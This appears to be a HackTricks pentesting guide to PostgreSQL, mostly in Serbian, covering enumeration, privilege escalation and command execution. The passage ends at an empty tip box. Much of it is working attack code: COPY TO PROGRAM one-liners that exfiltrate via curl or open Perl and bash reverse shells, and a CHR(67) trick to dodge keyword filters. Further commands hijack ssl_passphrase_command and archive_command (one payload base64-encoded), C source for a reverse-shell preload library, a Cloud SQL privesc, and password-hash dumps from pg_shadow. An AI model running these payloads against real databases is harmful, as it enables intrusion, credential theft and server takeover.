# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Osnovne informacije**

**PostgreSQL** je opisan kao **objektno-relacioni sistem za baze podataka** koji je **otvorenog koda**. Ovaj sistem ne samo da koristi jezik SQL, već ga proširuje dodatnim funkcijama. Njegove mogućnosti omogućavaju rukovanje širokim spektrom tipova podataka i operacija, što ga čini svestranim izborom za programere i organizacije.

**Podrazumevani port:** 5432, i ako je ovaj port već zauzet, čini se da postgresql koristi sledeći port (verovatno 5433) koji nije zauzet.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Povezivanje & Osnovna Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Ako pri pokretanju **`\list`** pronađete bazu podataka zvanu **`rdsadmin`**, znate da ste unutar **AWS postgresql database**.

Za više informacija o tome **kako zloupotrebiti PostgreSQL bazu podataka** pogledajte:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Automatska enumeracija
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Prema [**this research**](https://www.exploit-db.com/papers/13084), kada pokušaj veze ne uspe, `dblink` baca izuzetak `sqlclient_unable_to_establish_sqlconnection` koji sadrži objašnjenje greške. Primeri ovih detalja navedeni su u nastavku.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host je nedostupan

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port je zatvoren
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port je otvoren
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ili
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port je otvoren ili filtriran
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
U PL/pgSQL funkcijama trenutno nije moguće dobiti detalje o izuzecima. Međutim, ako imate direktan pristup PostgreSQL serveru, možete dohvatiti potrebne informacije. Ako izvlačenje korisničkih imena i lozinki iz sistemskih tabela nije izvodljivo, možete razmotriti korišćenje metode wordlist attack opisane u prethodnom odeljku, jer bi to moglo dati pozitivne rezultate.

## Enumeracija privilegija

### Role

| Tipovi role    |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rola ima superuser privilegije                                                                                                                      |
| rolinherit     | Rola automatski nasleđuje privilegije rola čiji je član                                                                                              |
| rolcreaterole  | Rola može kreirati druge role                                                                                                                       |
| rolcreatedb    | Rola može kreirati baze podataka                                                                                                                    |
| rolcanlogin    | Rola može da se prijavi. To jest, ovoj roli može biti dodeljen inicijalni identifikator autorizacije sesije                                         |
| rolreplication | Rola je uloga za replikaciju. Replikaciona rola može inicirati replikacione konekcije i kreirati i brisati replication slots.                        |
| rolconnlimit   | Za role koje se mogu prijaviti, ovo postavlja maksimalan broj istovremenih konekcija koje ta rola može ostvariti. -1 znači bez ograničenja.          |
| rolpassword    | Nije lozinka (uvek se prikazuje kao `********`)                                                                                                      |
| rolvaliduntil  | Vreme isteka lozinke (koristi se samo za autentikaciju lozinkom); null ako nema isteka                                                              |
| rolbypassrls   | Rola zaobilazi svaku row-level security politiku, pogledajte [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) za više informacija. |
| rolconfig      | Podrazumevana podešavanja za promenljive konfiguracije u toku izvršavanja, specifična za rolu                                                       |
| oid            | ID role                                                                                                                                            |

#### Zanimljive grupe

- Ako ste član **`pg_execute_server_program`** možete **izvršavati** programe
- Ako ste član **`pg_read_server_files`** možete **čitati** fajlove
- Ako ste član **`pg_write_server_files`** možete **pisati** fajlove

> [!TIP]
> Imajte na umu da su u Postgresu **korisnik**, **grupa** i **rola** isto. Sve zavisi od **kako ga koristite** i da li mu **dozvolite da se prijavi**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabele
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funkcije
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Radnje nad datotečnim sistemom

### Čitanje direktorijuma i fajlova

Iz ovog [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) članovi definisane **`DEFAULT_ROLE_READ_SERVER_FILES`** grupe (zvane **`pg_read_server_files`**) i **super korisnici** mogu da koriste **`COPY`** metodu na bilo kom putu (pogledajte `convert_and_check_filename` u `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Zapamti da, ako nisi superuser, ali imaš dozvolu **CREATEROLE**, možeš **učiniti sebe članom te grupe:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Postoje i **druge postgres funkcije** koje se mogu koristiti za **čitanje fajla ili listanje direktorijuma**. Samo **superuseri** i **korisnici sa eksplicitnim dozvolama** mogu ih koristiti:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Možete pronaći **više funkcija** na [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Jednostavno pisanje fajlova

Samo **super users** i članovi **`pg_write_server_files`** mogu koristiti copy za pisanje fajlova.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Imajte na umu da ako niste super user ali imate dozvole **`CREATEROLE`** možete **učiniti sebe članom te grupe:** 
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
 
Imajte na umu da COPY ne može da obradi newline karaktere, zato čak i ako koristite base64 payload morate poslati jednovrstični sadržaj (one-liner).\
Veoma važno ograničenje ove tehnike je da **`copy` ne može da se koristi za zapis binarnih fajlova jer menja neke binarne vrednosti.**

### **Otpremanje binarnih fajlova**

Međutim, postoje **druge tehnike za otpremanje velikih binarnih fajlova:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Ažuriranje podataka u PostgreSQL tabeli putem lokalnog zapisa fajla

Ako imate potrebne dozvole za čitanje i pisanje fajlova PostgreSQL servera, možete ažurirati bilo koju tabelu na serveru tako što ćete **prepisati odgovarajući filenode** u [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Potrebni koraci:

1.  Nabavite direktorijum podataka PostgreSQL-a

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Napomena:** Ako ne možete da dobijete trenutnu putanju direktorijuma podataka iz settings, možete upitati glavnu PostgreSQL verziju pomoću upita `SELECT version()` i pokušati brute-force putanju. Uobičajene putanje direktorijuma podataka na Unix instalacijama PostgreSQL-a su `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Uobičajeno ime clustera je `main`.

2.  Nabavite relativnu putanju do filenode-a povezanog sa ciljnom tabelom

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Ovaj upit bi trebalo da vrati nešto poput `base/3/1337`. Puna putanja na disku će biti `$DATA_DIRECTORY/base/3/1337`, npr. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Preuzmite filenode koristeći `lo_*` funkcije

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Dohvatite datatype povezan sa ciljnom tabelom

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Koristite [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) za [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); postavite sve `rol*` boolean zastavice na 1 da biste dobili pune dozvole.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Ponovo otpremite izmenjeni filenode koristeći `lo_*` funkcije i prepišite originalni fajl na disku

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opcionalno)_ Očistite keš tabela u memoriji pokretanjem zahtevnog SQL upita

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Sada biste trebali videti ažurirane vrednosti u tabeli u PostgreSQL-u.

Takođe možete postati superadmin uređivanjem tabele `pg_authid`. **Pogledajte** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE to program**

Od [ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), samo **super korisnici** i članovi grupe **`pg_execute_server_program`** mogu koristiti copy za RCE (primer sa exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Primer za exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Zapamtite da, ako niste superuser ali imate dozvole **`CREATEROLE`**, možete **učiniti sebe članom te grupe:** 
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ili koristite modul `multi/postgres/postgres_copy_from_program_cmd_exec` iz **metasploit**.\
Više informacija o ovoj ranjivosti [**ovde**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Iako je prijavljena kao CVE-2019-9193, Postgres je izjavio da je to [funkcionalnost i neće biti ispravljeno](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Zaobilaženje filtera ključnih reči/WAF da biste došli do COPY PROGRAM

U SQLi kontekstima sa stacked upitima, WAF može ukloniti ili blokirati literalni ključni izraz `COPY`. Možete dinamički konstruisati naredbu i izvršiti je unutar PL/pgSQL DO bloka. Na primer, izgradite vodeće C pomoću `CHR(67)` da zaobiđete naivne filtere i EXECUTE sastavljenu naredbu:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Once you have **learned** from the previous post **how to upload binary files** you could try obtain **RCE uploading a postgresql extension and loading it**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> The following RCE vectors are especially useful in constrained SQLi contexts, as all steps can be performed through nested SELECT statements

Konfiguracioni fajl PostgreSQL-a je upisiv od strane korisnika **postgres**, koji je korisnik koji pokreće bazu podataka, pa kao **superuser** možete pisati fajlove u filesystemu i stoga možete **prepisati ovaj fajl.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

More information [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

Konfiguracioni fajl sadrži neke zanimljive atribute koji mogu dovesti do RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Putanja do privatnog ključa baze
- `ssl_passphrase_command = ''` Ako je privatni fajl zaštićen lozinkom (šifrovan), postgresql će **izvesti komandu navedenu u ovom atributu**.
- `ssl_passphrase_command_supports_reload = off` **Ako** je ovaj atribut **on**, komanda koja će se izvesti ukoliko je ključ zaštićen lozinkom **biće izvršena** kada se pozove `pg_reload_conf()`.

Napadač će onda trebati da:

1. **Dump private key** sa servera
2. **Encrypt** preuzeti privatni ključ:
   1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Overwrite**
4. **Dump** trenutnu postgresql **konfiguraciju**
5. **Overwrite** **konfiguraciju** sa pomenutim atributima:
   1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
   2. `ssl_passphrase_command_supports_reload = on`
6. Execute `pg_reload_conf()`

Tokom testiranja sam primetio da će ovo raditi samo ako **private key file has privileges 640**, da je **owned by root** i da je u grupi **ssl-cert or postgres** (tako da korisnik postgres može da ga pročita), i nalazi se u _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Još jedan atribut u konfiguracionom fajlu koji je iskoristiv je `archive_command`.

Da bi ovo radilo, podešavanje `archive_mode` mora biti `'on'` ili `'always'`. Ako je to tačno, možemo prepisati komandu u `archive_command` i prisiliti njeno izvršavanje putem WAL (write-ahead logging) operacija.

Opšti koraci su:

1. Proverite da li je archive mode omogućen: `SELECT current_setting('archive_mode')`
2. Overwrite `archive_command` sa payload-om. Na primer, reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Reload konfiguraciju: `SELECT pg_reload_conf()`
4. Prisilite WAL operaciju da se izvrši, što će pozvati archive command: `SELECT pg_switch_wal()` ili `SELECT pg_switch_xlog()` za neke verzije Postgresa

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

Kada su potrebni višelinijski upisi (npr. da se podesi više GUCs), koristite PostgreSQL Large Objects da pročitate i potpuno prepišete konfiguraciju iz SQL-a. Ovaj pristup je idealan u SQLi kontekstima gde `COPY` ne može da obradi nove linije ili binary-safe upise.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
This yields reliable OS command execution via `archive_command` as the `postgres` user, provided `archive_mode` is enabled. In practice, setting a low `archive_timeout` can cause rapid invocation without requiring an explicit WAL switch.

#### **RCE with preload libraries**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

Ovaj vektor napada koristi sledeće konfiguracione promenljive:

- `session_preload_libraries` -- biblioteke koje će biti učitane od strane PostgreSQL servera prilikom konekcije klijenta.
- `dynamic_library_path` -- lista direktorijuma u kojima će PostgreSQL server tražiti biblioteke.

Možemo postaviti vrednost `dynamic_library_path` na direktorijum upisiv za korisnika `postgres` koji pokreće bazu, npr. direktorijum `/tmp/`, i tamo otpremiti maliciozni `.so` objekat. Zatim ćemo prisiliti PostgreSQL server da učita našu novootpremljenu biblioteku uključivanjem njenog imena u promenljivu `session_preload_libraries`.

The attack steps are:

1. Download the original `postgresql.conf`
2. Include the `/tmp/` directory in the `dynamic_library_path` value, e.g. `dynamic_library_path = '/tmp:$libdir'`
3. Include the malicious library name in the `session_preload_libraries` value, e.g. `session_preload_libraries = 'payload.so'`
4. Check major PostgreSQL version via the `SELECT version()` query
5. Compile the malicious library code with the correct PostgreSQL dev package Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Upload the malicious `postgresql.conf`, created in steps 2-3, and overwrite the original one
7. Upload the `payload.so` from step 5 to the `/tmp` directory
8. Reload the server configuration by restarting the server or invoking the `SELECT pg_reload_conf()` query
9. At the next DB connection, you will receive the reverse shell connection.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Prema the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Uloge koje imaju privilegiju **`CREATEROLE`** mogu **dodeljivati ili oduzimati članstvo u bilo kojoj roli** koja **nije** **superuser**._

Dakle, ako imate dozvolu **`CREATEROLE`**, možete sebi dodeliti pristup drugim **rolama** (koje nisu superuser) koje vam mogu omogućiti čitanje i upis fajlova i izvršavanje komandi:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Promena lozinke

Korisnici sa ovom ulogom takođe mogu **promeniti** **lozinke** drugih **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Često se dešava da **lokalni korisnici mogu da se prijave u PostgreSQL bez unošenja lozinke**. Stoga, kada steknete **dozvole za izvršavanje koda** možete zloupotrebiti te dozvole da biste dobili **`SUPERUSER`** ulogu:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Ovo je obično moguće zbog sledećih linija u fajlu **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

In [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) je objašnjeno kako je bilo moguće izvršiti **privesc** u Postgresu na GCP zloupotrebom ALTER TABLE privilegije koja je bila dodeljena korisniku.

Kada pokušate da **napravite drugog korisnika vlasnikom tabele** trebalo bi da dobijete **grešku** koja to sprečava, ali izgleda da je GCP dao tu **opciju korisniku postgres koji nije superuser** u GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Ako se ovu ideju poveže sa činjenicom da kada se komande **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) izvršavaju nad **tabelom sa index funkcijom**, ta **funkcija** se **poziva** kao deo komande sa privilegijama **vlasnika tabele**. Moguće je kreirati index sa funkcijom i dodeliti vlasnička prava **super user**-u nad tom tabelom, a zatim pokrenuti ANALYZE nad tabelom sa malicioznom funkcijom koja će moći da izvršava komande zato što koristi privilegije vlasnika.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Počnite kreiranjem nove tabele.
2. Ubacite neki irelevantan sadržaj u tabelu da obezbedite podatke za funkciju indeksa.
3. Razvijte zlonamernu funkciju indeksa koja sadrži payload za izvršavanje koda, što omogućava izvršavanje neovlašćenih komandi.
4. Promenite vlasnika tabele na "cloudsqladmin" pomoću ALTER; to je GCP-ova superuser uloga koju Cloud SQL koristi isključivo za upravljanje i održavanje baze podataka.
5. Izvršite ANALYZE nad tabelom. Ova akcija primorava PostgreSQL engine da pređe u korisnički kontekst vlasnika tabele, "cloudsqladmin". Posledično, zlonamerna funkcija indeksa se poziva sa privilegijama "cloudsqladmin", čime se omogućava izvršavanje ranije neovlašćene shell komande.

U PostgreSQL, ovaj tok izgleda otprilike ovako:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Zatim će tabela `shell_commands_results` sadržati izlaz izvršenog koda:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokalna prijava

Neke pogrešno konfigurisane postgresql instance mogu dozvoliti prijavu bilo kog lokalnog korisnika; moguće je prijaviti se lokalno sa 127.0.0.1 koristeći **`dblink` funkciju**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Imajte na umu da da bi prethodni upit radio **mora postojati funkcija `dblink`**. Ako ne postoji, možete pokušati da je kreirate pomoću
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
> Ako imate lozinku korisnika sa više privilegija, ali tom korisniku nije dozvoljeno da se prijavi sa eksternog IP-a, možete upotrebiti sledeću funkciju da izvršavate upite kao taj korisnik:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Moguće je proveriti da li ova funkcija postoji pomoću:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Prilagođena funkcija definisana sa** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters su uspeli da privesc unutar postgres instance koju je obezbedio IBM, zato što su **pronašli ovu funkciju sa SECURITY DEFINER flag-om**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Kao što je [**objašnjeno u dokumentaciji**](https://www.postgresql.org/docs/current/sql-createfunction.html) funkcija sa **SECURITY DEFINER se izvršava** sa privilegijama **korisnika koji je poseduje**. Stoga, ako je funkcija **ranjiva na SQL Injection** ili izvodi neke **privilegirane akcije sa parametrima koje kontroliše napadač**, može se zloupotrebiti za **eskalaciju privilegija unutar postgres-a**.

U liniji 4 prethodnog koda možete videti da funkcija ima **SECURITY DEFINER** flag.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
A zatim **izvrši komande**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Brute-force pomoću PL/pgSQL

**PL/pgSQL** je **potpuno opremljen programski jezik** koji pruža veću proceduralnu kontrolu u poređenju sa SQL-om. Omogućava korišćenje **petlji** i drugih **kontrolnih struktura** za unapređenje logike programa. Pored toga, **SQL statements** i **triggers** mogu pozivati funkcije kreirane korišćenjem **PL/pgSQL language**. Ova integracija omogućava sveobuhvatniji i fleksibilniji pristup programiranju i automatizaciji baza podataka.\
**Možete zloupotrebiti ovaj jezik da naterate PostgreSQL da izvrši brute-force nad korisničkim akreditivima.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
